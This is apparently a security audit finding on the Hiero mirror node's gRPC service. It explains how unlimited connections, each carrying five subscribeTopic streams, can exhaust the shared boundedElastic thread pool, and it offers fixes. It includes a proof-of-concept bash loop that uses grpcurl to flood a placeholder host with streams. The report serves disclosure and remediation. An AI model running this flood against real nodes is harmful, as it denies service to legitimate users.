### Title
Unbounded gRPC Connections Exhaust Shared `boundedElastic` Thread Pool via `PollingTopicListener.listen()`

### Summary
`PollingTopicListener.listen()` schedules an infinite-repeat blocking database poll on the JVM-global `Schedulers.boundedElastic()` thread pool for every subscriber. The only server-side guard is `maxConcurrentCallsPerConnection = 5`, which limits calls per TCP connection but imposes no cap on the number of connections or total concurrent subscriptions. An unauthenticated attacker can open an arbitrary number of TCP connections, each carrying 5 subscriptions, saturating the shared bounded-elastic thread pool and starving all legitimate subscribers.

### Finding Description

**Exact code path:**

`PollingTopicListener.java` line 31 allocates the scheduler by calling the static factory `Schedulers.boundedElastic()`, which returns the **single JVM-global** bounded-elastic scheduler (cap = `10 × availableProcessors` threads, task queue = 100 000):

```java
// line 31
private final Scheduler scheduler = Schedulers.boundedElastic();
```

`listen()` (lines 34–48) wires every new subscriber directly onto that shared scheduler:

```java
return Flux.defer(() -> poll(context))
    .delaySubscription(interval, scheduler)          // line 39 – occupies a scheduler thread for the delay
    .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)      // line 40 – effectively infinite
            .jitter(0.1)
            .withFixedDelay(interval)
            .withScheduler(scheduler))               // line 43 – every repeat delay dispatched on same pool
    ...
```

`poll()` (lines 51–61) calls `topicMessageRepository.findByFilter(newFilter)`, which returns a `Stream<TopicMessage>` — a **blocking JDBC call** that holds a bounded-elastic thread for its entire duration.

**No connection-count guard exists.** `GrpcConfiguration.java` (lines 28–35) configures only:

```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
// NettyProperties default: 5
```

There is no `maxConnections`, no per-IP limit, no `maxConnectionAge`, and no authentication interceptor anywhere in `grpc/src/main/` (confirmed: zero matches for `Security`, `authentication`, `authorization`, `ServerInterceptor` in production sources).

**Exploit flow:**

1. Attacker opens `C` TCP connections to port 5600 (no limit enforced).
2. On each connection, attacker issues 5 concurrent `subscribeTopic` RPCs (the per-connection cap).
3. Each RPC reaches `PollingTopicListener.listen()`, which immediately schedules a `delaySubscription` task and then a `repeatWhen` loop — both on the global bounded-elastic pool.
4. Every 500 ms (default `interval`), each subscription fires `poll()` → blocking DB query → occupies one bounded-elastic thread until the query returns.
5. With `C × 5` concurrent subscriptions all polling simultaneously, the `10 × CPU` thread cap is reached; further tasks queue up to 100 000 entries, then are rejected with `RejectedExecutionException`, propagating errors to all subscribers including legitimate ones.

### Impact Explanation
When the bounded-elastic pool is saturated, every other component that relies on it (other `listen()` calls, `PollingTopicMessageRetriever`, `SharedPollingTopicListener`, `TopicMessageServiceImpl`, `NetworkServiceImpl`) is starved. Legitimate subscribers receive no messages or receive errors. The service is effectively unavailable for the duration of the attack. Severity: **High** (complete DoS of the gRPC streaming API with no authentication barrier).

### Likelihood Explanation
The attack requires only a standard gRPC client (e.g., `grpcurl`) and a network path to port 5600. No credentials, tokens, or special knowledge are needed. The `subscribeTopic` RPC is publicly documented. A single attacker machine can open hundreds of TCP connections in seconds. The attack is trivially repeatable and scriptable.

### Recommendation

1. **Limit total concurrent subscriptions** — maintain a global `AtomicInteger` counter in `PollingTopicListener` (or a shared service layer) and reject `listen()` calls above a configurable threshold.
2. **Add a per-IP connection limit** in `GrpcConfiguration` via `NettyServerBuilder` (e.g., a custom `ServerTransportFilter` that tracks connections per remote address).
3. **Expose a configurable `maxConnections`** property in `NettyProperties` alongside `maxConcurrentCallsPerConnection`.
4. **Use a dedicated, bounded scheduler** per listener type rather than the JVM-global `Schedulers.boundedElastic()`, so a flood of polling subscriptions cannot starve unrelated reactive pipelines.
5. **Add authentication/authorization** to the gRPC endpoint so that unauthenticated clients cannot open streaming subscriptions at all.

### Proof of Concept

```bash
# Open 20 connections × 5 subscriptions = 100 concurrent infinite-polling streams
# (adjust --parallel and loop count to match target CPU count × 10)
for i in $(seq 1 20); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID": {"topicNum": 1}, "limit": 0}' \
      <mirror-node-host>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# Legitimate subscriber — will stall or error once bounded-elastic pool is exhausted
grpcurl -plaintext \
  -d '{"topicID": {"topicNum": 1}, "limit": 0}' \
  <mirror-node-host>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
```

On a 4-core host the bounded-elastic cap is 40 threads. 100 concurrent subscriptions each issuing a blocking DB query every 500 ms will saturate the pool; the legitimate subscriber's polling tasks queue indefinitely and no messages are delivered. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L31-31)
```java
    private final Scheduler scheduler = Schedulers.boundedElastic();
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L34-48)
```java
    public Flux<TopicMessage> listen(TopicMessageFilter filter) {
        PollingContext context = new PollingContext(filter);
        Duration interval = listenerProperties.getInterval();

        return Flux.defer(() -> poll(context))
                .delaySubscription(interval, scheduler)
                .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                        .jitter(0.1)
                        .withFixedDelay(interval)
                        .withScheduler(scheduler))
                .name(METRIC)
                .tag(METRIC_TAG, "poll")
                .tap(Micrometer.observation(observationRegistry))
                .doOnNext(context::onNext)
                .doOnSubscribe(s -> log.info("Starting to poll every {}ms: {}", interval.toMillis(), filter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/listener/PollingTopicListener.java (L51-61)
```java
    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getCount().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
        long startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L28-35)
```java
    ServerBuilderCustomizer<NettyServerBuilder> grpcServerConfigurer(
            GrpcProperties grpcProperties, Executor applicationTaskExecutor) {
        final var nettyProperties = grpcProperties.getNetty();
        return serverBuilder -> {
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
        };
    }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```
